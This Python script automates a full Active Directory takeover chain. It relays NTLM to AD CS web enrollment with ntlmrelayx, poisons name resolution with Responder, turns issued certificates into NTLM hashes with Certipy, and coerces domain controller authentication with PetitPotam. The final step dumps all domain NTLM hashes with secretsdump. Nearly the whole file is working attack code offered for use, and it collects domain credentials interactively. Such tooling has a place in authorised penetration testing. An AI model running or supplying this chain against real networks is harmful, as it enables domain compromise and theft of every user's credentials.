import subprocess
import time
import logging
import re
from tqdm import tqdm
import os

# Paths to tools, adjust as necessary
ntlmrelayx_path = "ntlmrelayx.py"
responder_path = "responder"
certipy_path = "certipy"
petitpotam_path = "/root/tools/PetitPotam/PetitPotam.py"
secretsdump_path = "/root/.local/bin/secretsdump.py"

# Configure logging
logging.basicConfig(filename='automation.log', level=logging.INFO,
                    format='%(asctime)s - %(levelname)s - %(message)s')

def run_command(command, step_desc, sleep_time=0, is_background=False, capture_output=False):
    """
    Run a shell command with optional sleep time, output capture, and error handling.

    Parameters:
    command (list): The command to run as a list of arguments.
    step_desc (str): Description of the current step for logging purposes.
    sleep_time (int): Time to sleep after running the command.
    is_background (bool): Whether the command should run in the background.
    capture_output (bool): Whether to capture the command output.

    Returns:
    subprocess.Popen or str: Process handle if running in background, captured output if capture_output is True, else None.
    """
    try:
        logging.info(f"Starting step: {step_desc}")
        if is_background:
            process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            time.sleep(sleep_time)  # Allow the process to initialize
            return process
        elif capture_output:
            process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            stdout, stderr = process.communicate()
            time.sleep(sleep_time)
            if process.returncode != 0:
                logging.error(f"Error in step '{step_desc}': {stderr}")
                print(f"[Error] Step failed: {step_desc}. Check the logs for more information.")
                return None
            return stdout
        else:
            subprocess.run(command, check=True)
            time.sleep(sleep_time)
    except subprocess.CalledProcessError as e:
        logging.error(f"Error in step '{step_desc}': {e}")
        print(f"[Error] Step failed: {step_desc}. Check the logs for more information.")
    except Exception as e:
        logging.error(f"Unexpected error in step '{step_desc}': {e}")
        print(f"[Error] Unexpected error during step: {step_desc}. Check the logs for details.")

def wait_for_pfx(process, step_desc):
    """
    Wait for a specific output indicating the PFX certificate has been written.

    Parameters:
    process (subprocess.Popen): The process handle to read output from.
    step_desc (str): Description of the current step for logging purposes.

    Returns:
    bool: True if the PFX certificate is found, False otherwise.
    """
    try:
        logging.info(f"Waiting for PFX generation in step: {step_desc}")
        while True:
            output = process.stdout.readline()
            if output == '' and process.poll() is not None:
                break
            if "Writing PKCS#12 certificate to" in output:
                logging.info(f"Found PFX certificate: {output.strip()}")
                return True
            time.sleep(1)
    except Exception as e:
        logging.error(f"Unexpected error while waiting for PFX in step '{step_desc}': {e}")
        print(f"[Error] Unexpected error during step: {step_desc}. Check the logs for details.")
    return False


def main():
    # Prompt user for input values
    domain_controller_ip = input("Enter the Domain Controller IP address: ")
    your_ip = input("Enter your IP address: ")
    domain_name = input("Enter the domain name (e.g., domain.local): ")
    domain_user = input("Enter the domain user name (e.g., jsmith@hadrian.local): ")
    domain_password = input("Enter the domain user's password (e.g., Password123): ")

    # Step 0: Query CA Authority information using Certipy
    certipy_ca_cmd = [
        certipy_path, "find", "-u", domain_user, "-p", domain_password, "-dc-ip", domain_controller_ip, "-stdout"
    ]
    certipy_ca_output = run_command(certipy_ca_cmd, "Query CA Authority using Certipy", capture_output=True)
    ca_authority_ip = None
    if certipy_ca_output:
        ca_match = re.search(r"DNS Name                            : (\S+)", certipy_ca_output)
        if ca_match:
            ca_authority_ip = ca_match.group(1)
            logging.info(f"Extracted CA Authority IP/Name: {ca_authority_ip}")
        else:
            logging.error("Failed to extract CA Authority IP/Name from Certipy output.")
            print("[Error] Failed to extract CA Authority IP/Name. Check the logs for more information.")
            return

    # Progress bar setup
    steps = [
        "Start ntlmrelayx.py (Initial Relay)",
        "Start Responder to Poison Responses",
        "Run Certipy to Authenticate and Extract Username/Hash",
        "Stop Responder",
        "Run ntlmrelayx.py with DomainController Template",
        "Coerce Domain Controller Authentication with PetitPotam",
        "Dump Secrets with secretsdump.py"
    ]

    with tqdm(total=len(steps), desc="Automating Attack Sequence", unit="step") as pbar:
        # Step 1: Start ntlmrelayx.py for initial relay
        ntlmrelayx_cmd = [
            ntlmrelayx_path,
            "-t", f"http://{ca_authority_ip}/certsrv/certfnsh.asp",
            "-smb2support", "--adcs", "-of", "logs", "--raw-port", "6667"
        ]
        # Start ntlmrelayx process in the current terminal and capture its handle
        ntlmrelayx_process = subprocess.Popen(ntlmrelayx_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        time.sleep(10)  # Allow time for ntlmrelayx to initialize
        pbar.update(1)

        # Wait for the PFX certificate to be generated before proceeding
        if not wait_for_pfx(ntlmrelayx_process, steps[0]):
            logging.error("PFX certificate was not generated by ntlmrelayx.")
            print("[Error] PFX certificate was not generated. Check the logs for more information.")
            return

        # Step 2: Start Responder in a new terminal window
        responder_cmd = [responder_path, "-I", "eth0", "-vwF"]
        os.system(f'gnome-terminal -- bash -c "{" ".join(responder_cmd)}; exec bash"')
        time.sleep(5)  # Allow time for Responder to initialize
        pbar.update(1)

        # Step 3: Run Certipy to authenticate and extract username/NTLM hash
        certipy_cmd = [
            certipy_path, "auth", "-pfx", "ADMINISTRATOR.pfx",
            "-dc-ip", domain_controller_ip
        ]
        logging.info("Running Certipy to authenticate and extract username/NTLM hash...")
        certipy_output = run_command(certipy_cmd, steps[2], capture_output=True)
        if certipy_output:
            logging.info(f"Certipy output: {certipy_output}")
        else:
            logging.error("No output captured from Certipy command.")
            print("[Error] No output captured from Certipy command. Check the logs for more information.")
            return
        pbar.update(1)

        # Extract username and NTLM hash from Certipy output
        username = None
        ntlm_hash = None
        if certipy_output:
            username_match = re.search(r"Trying to retrieve NT hash for '([^']+)'", certipy_output)
            hash_match = re.search(r"Got hash for '([^']+)': ([a-fA-F0-9:]+)", certipy_output)
            if username_match and hash_match:
                username = username_match.group(1)
                ntlm_hash = hash_match.group(2)
                logging.info(f"Extracted Username: {username}")
                logging.info(f"Extracted NTLM Hash: {ntlm_hash}")
            else:
                logging.error("Failed to extract username or NTLM hash from Certipy output.")
                print("[Error] Failed to extract username or NTLM hash. Check the logs for more information.")
                return

        # Step 4: Stop Responder
        os.system("pkill -f responder")  # Kill Responder process running in separate terminal
        logging.info("Responder terminated successfully.")
        pbar.update(1)

        # Step 5: Run ntlmrelayx.py with DomainController template
        os.system("pkill -f ntlmrelayx.py")
        time.sleep(5)
        ntlmrelayx_dc_cmd = [
            ntlmrelayx_path,
            "-t", f"http://{ca_authority_ip}/certsrv/certfnsh.asp",
            "-smb2support", "--adcs", "--raw-port", "6667", "--template", "DomainController"
        ]
        os.system(f'gnome-terminal -- bash -c "{" ".join(ntlmrelayx_dc_cmd)}; exec bash"')
        time.sleep(10)  # Allow time for ntlmrelayx_dc to initialize
        pbar.update(1)

        # Step 6: Coerce Domain Controller authentication with PetitPotam
        petitpotam_cmd = [
            "python3", petitpotam_path,
            "-u", username, "-hashes", f"{ntlm_hash}",
            "-d", domain_name, "-dc-ip", domain_controller_ip, your_ip, domain_controller_ip
        ]
        run_command(petitpotam_cmd, steps[5], sleep_time=15)
        pbar.update(1)

        # Step 7: Run Certipy to authenticate and extract DC name/NTLM hash
        certipy_dc_cmd = [
            certipy_path, "auth", "-pfx", "DC1$.pfx",
            "-dc-ip", domain_controller_ip
        ]
        logging.info("Running Certipy to authenticate and extract username/NTLM hash...")
        certipy_dc_output = run_command(certipy_dc_cmd, steps[2], capture_output=True)
        if certipy_dc_output:
            logging.info(f"Certipy output: {certipy_dc_output}")
        else:
            logging.error("No output captured from Certipy command.")
            print("[Error] No output captured from Certipy command. Check the logs for more information.")
            return
        pbar.update(1)

        # Extract DC name and NTLM hash from Certipy output
        dc_name = None
        dc_ntlm_hash = None
        if certipy_dc_output:
            dc_name_match = re.search(r"Trying to retrieve NT hash for '([^']+)'", certipy_dc_output)
            dc_hash_match = re.search(r"Got hash for '([^']+)': ([a-fA-F0-9:]+)", certipy_dc_output)
            if dc_name_match and dc_hash_match:
                dc_name = dc_name_match.group(1)
                dc_ntlm_hash = dc_hash_match.group(2)
                logging.info(f"Extracted DC name: {dc_name}")
                logging.info(f"Extracted DC NTLM Hash: {dc_ntlm_hash}")
            else:
                logging.error("Failed to extract DC Name or NTLM hash from Certipy output.")
                print("[Error] Failed to extract DC Name or NTLM hash. Check the logs for more information.")
                return

        # Step 7: Dump secrets with secretsdump.py
        secretsdump_cmd = [
            secretsdump_path,
            f"{domain_name}/{dc_name}@{domain_controller_ip}",
            "-hashes", f"{dc_ntlm_hash}", "-just-dc-ntlm"
        ]
        print(secretsdump_cmd)
        run_command(secretsdump_cmd, steps[6])
        pbar.update(1)

        # Cleanup
        if ntlmrelayx_process:
            ntlmrelayx_process.terminate()
            logging.info("Domain Controller ntlmrelayx process terminated successfully.")

if __name__ == "__main__":
    main()
